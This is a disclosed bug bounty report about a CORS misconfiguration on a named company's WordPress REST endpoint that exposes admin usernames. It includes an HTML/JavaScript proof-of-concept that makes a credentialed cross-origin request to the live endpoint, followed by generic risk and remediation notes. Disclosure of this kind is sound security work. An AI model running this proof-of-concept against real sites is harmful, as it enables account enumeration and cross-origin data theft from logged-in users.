# Unsafe cors sharing of admin users 

## Report Details
- **Report ID**: 772744
- **URL**: https://hackerone.com/reports/772744
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-01-12T16:31:07.186Z
- **Disclosed**: 2020-04-30T23:28:54.397Z

## Reporter
- **Username**: pwrspl0it
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: mtn_group

## Vulnerability Information
hello,


the following endpoint https://lonestarcell.com/wp-json/wp/v2/users/ has an unsafe sharing of sensitive information of admin usernames

check poc script below :

```html
<html>
     <body>
         <h2>CORS PoC</h2>
         <div id="demo">
             <button type="button" onclick="cors()">Exploit</button>
         </div>
         <script>
             function cors() {
             var xhr = new XMLHttpRequest();
             xhr.onreadystatechange = function() {
                 if (this.readyState == 4 && this.status == 200) {
                 document.getElementById("demo").innerHTML = alert(this.responseText);
                 }
             };
              xhr.open("GET",
                       "https://lonestarcell.com/wp-json/wp/v2/users/", true);
             xhr.withCredentials = true;
             xhr.send();
             }
         </script>
     </body>
 </html>
```
If another domain is allowed by the policy, then that domain can potentially attack users of the application. If a user is logged in to the application, and visits a domain allowed by the policy, then any malicious content running on that domain can potentially retrieve content from the application, and sometimes carry out actions within the security context of the logged in user.
Even if an allowed domain is not overtly malicious in itself, security vulnerabilities within that domain could potentially be leveraged by an attacker to exploit the trust relationship and attack the application that allows access. CORS policies on pages containing sensitive information should be reviewed to determine whether it is appropriate for the application to trust both the intentions and security posture of any domains granted access.
Remediation
=====================
###Rest API should be visible just for logged admins .


best regards,

## Impact

References
=====================

###https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties

## Attachments
No attachments
